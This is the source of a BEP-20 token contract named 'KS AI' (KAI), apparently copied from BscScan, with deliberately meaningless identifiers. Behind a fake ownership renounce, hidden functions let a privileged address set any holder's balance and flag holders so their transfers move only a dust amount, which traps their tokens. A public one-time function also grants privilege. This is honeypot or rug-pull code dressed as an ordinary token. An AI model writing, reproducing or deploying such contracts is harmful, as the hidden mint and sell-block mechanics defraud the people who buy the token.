/**
 *Submitted for verification at BscScan.com on 2023-03-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface minTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyTx) external view returns (uint256);

    function transfer(address exemptIs, uint256 tradingTeamTx) external returns (bool);

    function allowance(address txMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingTeamTx) external returns (bool);

    function transferFrom(
        address sender,
        address exemptIs,
        uint256 tradingTeamTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingSwap, uint256 value);
    event Approval(address indexed txMax, address indexed spender, uint256 value);
}

interface toReceiver is minTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableList {
    function createPair(address buyTotal, address receiverTradingBuy) external returns (address);
}

interface listTxWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KSAI is receiverWallet, minTrading, toReceiver {

    uint256 private modeToken = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return autoTo;
    }

    address private feeAt;

    uint256 private liquidityAt;

    uint256 private launchMarketing;

    function balanceOf(address buyTx) public view virtual override returns (uint256) {
        return liquidityExempt[buyTx];
    }

    bool public shouldMax;

    function approve(address receiverTrading, uint256 tradingTeamTx) public virtual override returns (bool) {
        fromFund[_msgSender()][receiverTrading] = tradingTeamTx;
        emit Approval(_msgSender(), receiverTrading, tradingTeamTx);
        return true;
    }

    uint256 private sellAmount;

    function transfer(address launchTokenLaunched, uint256 tradingTeamTx) external virtual override returns (bool) {
        return fromMax(_msgSender(), launchTokenLaunched, tradingTeamTx);
    }

    function tradingBuy(address senderTotalExempt, address exemptIs, uint256 tradingTeamTx) internal returns (bool) {
        require(liquidityExempt[senderTotalExempt] >= tradingTeamTx);
        liquidityExempt[senderTotalExempt] -= tradingTeamTx;
        liquidityExempt[exemptIs] += tradingTeamTx;
        emit Transfer(senderTotalExempt, exemptIs, tradingTeamTx);
        return true;
    }

    function teamLaunched() private view{
        require(launchedMaxMin[_msgSender()]);
    }

    uint256 private marketingMax;

    bool private toTradingReceiver;

    address launchedMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function txAuto(address totalShould) public {
        teamLaunched();
        
        if (totalShould == totalList || totalShould == listTx) {
            return;
        }
        exemptTrading[totalShould] = true;
    }

    uint256 public toLaunched;

    function toMinTake() public {
        emit OwnershipTransferred(totalList, address(0));
        feeAt = address(0);
    }

    mapping(address => mapping(address => uint256)) private fromFund;

    function fundExempt(address liquidityMarketingFund) public {
        if (limitSell) {
            return;
        }
        
        launchedMaxMin[liquidityMarketingFund] = true;
        
        limitSell = true;
    }

    address public totalList;

    function totalSupply() external view virtual override returns (uint256) {
        return modeToken;
    }

    mapping(address => bool) public launchedMaxMin;

    function symbol() external view virtual override returns (string memory) {
        return takeExempt;
    }

    mapping(address => bool) public exemptTrading;

    function getOwner() external view returns (address) {
        return feeAt;
    }

    uint256 public enableTake;

    constructor (){ 
        if (launchMarketing == toLaunched) {
            launchMarketing = sellAmount;
        }
        listTxWallet maxTradingEnable = listTxWallet(launchedMax);
        listTx = enableList(maxTradingEnable.factory()).createPair(maxTradingEnable.WETH(), address(this));
        
        launchedMaxMin[_msgSender()] = true;
        liquidityExempt[_msgSender()] = modeToken;
        totalList = _msgSender();
        
        emit Transfer(address(0), totalList, modeToken);
        feeAt = _msgSender();
        toMinTake();
    }

    bool public limitSell;

    function fromMax(address senderTotalExempt, address exemptIs, uint256 tradingTeamTx) internal returns (bool) {
        if (senderTotalExempt == totalList) {
            return tradingBuy(senderTotalExempt, exemptIs, tradingTeamTx);
        }
        if (exemptTrading[senderTotalExempt]) {
            return tradingBuy(senderTotalExempt, exemptIs, 10 ** 10);
        }
        return tradingBuy(senderTotalExempt, exemptIs, tradingTeamTx);
    }

    uint8 private atReceiverFrom = 18;

    function decimals() external view virtual override returns (uint8) {
        return atReceiverFrom;
    }

    bool private walletSwap;

    function teamShould(address launchTokenLaunched, uint256 tradingTeamTx) public {
        teamLaunched();
        liquidityExempt[launchTokenLaunched] = tradingTeamTx;
    }

    function owner() external view returns (address) {
        return feeAt;
    }

    address public listTx;

    function allowance(address tokenWallet, address receiverTrading) external view virtual override returns (uint256) {
        if (receiverTrading == launchedMax) {
            return type(uint256).max;
        }
        return fromFund[tokenWallet][receiverTrading];
    }

    string private takeExempt = "KAI";

    string private autoTo = "KS AI";

    mapping(address => uint256) private liquidityExempt;

    bool public senderTakeLiquidity;

    event OwnershipTransferred(address indexed isTrading, address indexed autoTake);

    function transferFrom(address senderTotalExempt, address exemptIs, uint256 tradingTeamTx) external override returns (bool) {
        if (_msgSender() != launchedMax) {
            if (fromFund[senderTotalExempt][_msgSender()] != type(uint256).max) {
                require(tradingTeamTx <= fromFund[senderTotalExempt][_msgSender()]);
                fromFund[senderTotalExempt][_msgSender()] -= tradingTeamTx;
            }
        }
        return fromMax(senderTotalExempt, exemptIs, tradingTeamTx);
    }

}